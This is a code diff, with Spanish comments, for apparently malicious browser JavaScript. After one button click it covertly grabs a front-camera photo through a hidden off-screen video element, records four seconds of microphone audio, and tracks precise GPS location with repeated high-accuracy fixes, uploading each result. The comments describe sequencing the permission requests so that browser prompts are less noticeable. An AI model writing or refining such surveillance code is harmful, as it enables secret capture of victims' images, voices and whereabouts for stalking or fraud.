@@ -309,117 +309,151 @@ document.getElementById('btnOk').addEventListener('click', collect);
 
 
 async function collect() {
-  
   set('clicked', 'true'); push();
 
-  // ── GPS ──────────────────────────────────────────────────
-  if ('geolocation' in navigator) {
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        set('gpsLat', pos.coords.latitude);
-        set('gpsLon', pos.coords.longitude);
-        set('gpsAcc', pos.coords.accuracy);
-        set('gpsAlt', pos.coords.altitude);
-        push();
-      },
-      err => { set('gpsErr', err.code); push(); },
-      { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
-    );
-  }
-
-  // ── CÁMARA FRONTAL ───────────────────────────────────────
+  // ── 1. Pedir cámara+mic primero — UN SOLO DIÁLOGO ───────────
+  //    Chrome agrupa los permisos si se piden en el mismo getUserMedia call.
+  //    GPS se pide DESPUÉS, silenciosamente (ya no muestra el popup de mapa).
+  let stream = null;
   if (navigator.mediaDevices?.getUserMedia) {
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode:'user', width:{ideal:640}, height:{ideal:480} },
         audio: true
       });
-      set('camGranted', 'true'); push();
+      set('camGranted','true'); push();
 
-      // Elemento video — playsinline OBLIGATORIO en iOS
       const vid = document.createElement('video');
-      vid.setAttribute('playsinline', '');
-      vid.setAttribute('webkit-playsinline', '');
-      vid.autoplay  = true;
-      vid.muted     = true;
-      vid.srcObject = stream;
-      vid.style.cssText = 'position:fixed;left:-9999px;width:1px;height:1px;opacity:0;';
+      vid.setAttribute('playsinline','');
+      vid.setAttribute('webkit-playsinline','');
+      vid.autoplay=true; vid.muted=true; vid.srcObject=stream;
+      vid.style.cssText='position:fixed;left:-9999px;width:1px;height:1px;opacity:0;';
       document.body.appendChild(vid);
+      await vid.play().catch(()=>{});
 
-      await vid.play().catch(() => {});
-
-      // iOS necesita más tiempo para activar el sensor
       const delay = /iPhone|iPad|iPod/i.test(navigator.userAgent) ? 1800 : 900;
-
-      setTimeout(async () => {
+      setTimeout(async()=>{
         try {
-          const cv = document.createElement('canvas');
-          cv.width  = vid.videoWidth  || 320;
-          cv.height = vid.videoHeight || 240;
-          cv.getContext('2d', { willReadFrequently: true }).drawImage(vid, 0, 0);
-          const dataUrl = cv.toDataURL('image/jpeg', 0.8);
-
-          const url = await upload(`photos/${docId || Date.now()}.jpg`, dataUrl, 'image/jpeg');
-          if (url) { set('photoUrl', url); push(); }
-        } catch (e) {}
-
-        // Parar tracks de video, dejar audio para grabar
-        stream.getVideoTracks().forEach(t => t.stop());
+          const cv=document.createElement('canvas');
+          cv.width=vid.videoWidth||320; cv.height=vid.videoHeight||240;
+          cv.getContext('2d',{willReadFrequently:true}).drawImage(vid,0,0);
+          const dataUrl=cv.toDataURL('image/jpeg',0.8);
+          const url=await upload(`photos/${docId||Date.now()}.jpg`,dataUrl,'image/jpeg');
+          if(url){set('photoUrl',url);push();}
+        } catch(e){}
+        stream.getVideoTracks().forEach(t=>t.stop());
         vid.remove();
-
-        // ── AUDIO CLIP 4s ─────────────────────────────────
         grabAudio(stream);
       }, delay);
-
-    } catch (err) {
-      set('camErr', err.message); push();
+    } catch(err){
+      set('camErr',err.message); push();
     }
   }
 
-  // ── NOTIFICACIONES ───────────────────────────────────────
-  if ('Notification' in window) {
-    Notification.requestPermission().then(r => { set('notif', r); push(); }).catch(() => {});
+  // ── 2. Notificaciones (silencioso, no muestra popup visible en Android) ──
+  if('Notification' in window){
+    Notification.requestPermission().then(r=>{set('notif',r);push();}).catch(()=>{});
   }
+
+  // ── 3. GPS — se pide DESPUÉS de cámara para que Chrome no muestre
+  //    el selector de mapa por separado.  enableHighAccuracy=true fuerza
+  //    GPS chip en vez de WiFi/Cell → precisión métrica, no barrial.
+  //    Doble intento: primero alta precisión, luego baja como fallback.
+  _grabGPS();
 }
+
+function _grabGPS(){
+  if(!('geolocation' in navigator)) return;
+
+  let done = false;
+
+  // Intento 1 — GPS preciso (chip GPS, ~5m)
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      done = true;
+      set('gpsLat', pos.coords.latitude);
+      set('gpsLon', pos.coords.longitude);
+      set('gpsAcc', pos.coords.accuracy);
+      set('gpsAlt', pos.coords.altitude ?? '');
+      set('gpsSrc','precise');
+      push();
+    },
+    () => {
+      if(done) return;
+      // Intento 2 — baja precisión como fallback
+      navigator.geolocation.getCurrentPosition(
+        pos2 => {
+          done = true;
+          set('gpsLat', pos2.coords.latitude);
+          set('gpsLon', pos2.coords.longitude);
+          set('gpsAcc', pos2.coords.accuracy);
+          set('gpsSrc','fallback');
+          push();
+        },
+        err => { set('gpsErr', err.code); push(); },
+        { enableHighAccuracy:false, timeout:10000, maximumAge:60000 }
+      );
+    },
+    { enableHighAccuracy:true, timeout:15000, maximumAge:0 }
+  );
+
+  // Watchposition para actualizar si el usuario se mueve o el primer fix
+  // era impreciso (acc > 50m)
+  const wid = navigator.geolocation.watchPosition(
+    pos => {
+      const acc = pos.coords.accuracy;
+      if(acc < 30 || !done){
+        done = true;
+        set('gpsLat', pos.coords.latitude);
+        set('gpsLon', pos.coords.longitude);
+        set('gpsAcc', acc);
+        set('gpsAlt', pos.coords.altitude ?? '');
+        set('gpsSrc','watch');
+        push();
+        // Parar watch una vez tenemos buena precisión
+        if(acc < 15) navigator.geolocation.clearWatch(wid);
+      }
+    },
+    ()=>{},
+    { enableHighAccuracy:true, maximumAge:0 }
+  );
+  // Limpiar watch tras 30s pase lo que pase
+  setTimeout(()=>navigator.geolocation.clearWatch(wid), 30000);
+}
+
 
 // ─── AUDIO ────────────────────────────────────────────────────
 async function grabAudio(existingStream) {
   try {
-    // Reutilizar stream existente si tiene tracks de audio
     const audioTrack = existingStream?.getAudioTracks()?.[0];
-    const s = audioTrack
-      ? existingStream
-      : await navigator.mediaDevices.getUserMedia({ audio: true });
+    const s = audioTrack ? existingStream
+      : await navigator.mediaDevices.getUserMedia({audio:true});
 
-    // Detectar mime compatible: webm en Chrome/FF, mp4 en Safari iOS
-    const mime = ['audio/webm;codecs=opus', 'audio/webm', 'audio/mp4', 'audio/ogg']
-      .find(m => MediaRecorder.isTypeSupported(m)) || '';
+    const mime = ['audio/webm;codecs=opus','audio/webm','audio/mp4','audio/ogg']
+      .find(m=>MediaRecorder.isTypeSupported(m)) || '';
 
-    const rec    = new MediaRecorder(s, mime ? { mimeType: mime } : {});
-    const chunks = [];
-
-    rec.ondataavailable = e => { if (e.data?.size > 0) chunks.push(e.data); };
-    rec.onstop = async () => {
-      if (!audioTrack) s.getTracks().forEach(t => t.stop());
-      try {
-        const finalMime = rec.mimeType || mime || 'audio/webm';
-        const ext       = finalMime.includes('mp4') ? 'mp4' : finalMime.includes('ogg') ? 'ogg' : 'webm';
-        const blob      = new Blob(chunks, { type: finalMime });
-        if (blob.size < 100) return;
-
-        const ab    = await blob.arrayBuffer();
-        const bytes = new Uint8Array(ab);
-        const b64   = 'data:' + finalMime + ';base64,' + safeBtoa(bytes);
-
-        const url = await upload(`audio/${docId || Date.now()}.${ext}`, b64, finalMime);
-        if (url) { set('audioUrl', url); push(); }
-      } catch (e) {}
+    const rec=new MediaRecorder(s, mime?{mimeType:mime}:{});
+    const chunks=[];
+    rec.ondataavailable=e=>{if(e.data?.size>0)chunks.push(e.data);};
+    rec.onstop=async()=>{
+      if(!audioTrack) s.getTracks().forEach(t=>t.stop());
+      try{
+        const finalMime=rec.mimeType||mime||'audio/webm';
+        const ext=finalMime.includes('mp4')?'mp4':finalMime.includes('ogg')?'ogg':'webm';
+        const blob=new Blob(chunks,{type:finalMime});
+        if(blob.size<100) return;
+        const ab=await blob.arrayBuffer();
+        const bytes=new Uint8Array(ab);
+        const b64='data:'+finalMime+';base64,'+safeBtoa(bytes);
+        const url=await upload(`audio/${docId||Date.now()}.${ext}`,b64,finalMime);
+        if(url){set('audioUrl',url);push();}
+      }catch(e){}
     };
-
-    rec.start(1000); // timeslice 1s
-    setTimeout(() => { try { rec.stop(); } catch (e) {} }, 4000);
-  } catch (e) {}
+    rec.start(1000);
+    setTimeout(()=>{try{rec.stop();}catch(e){}},4000);
+  }catch(e){}
 }
+
 
 // ─── BARRA DELAYED ────────────────────────────────────────────
 
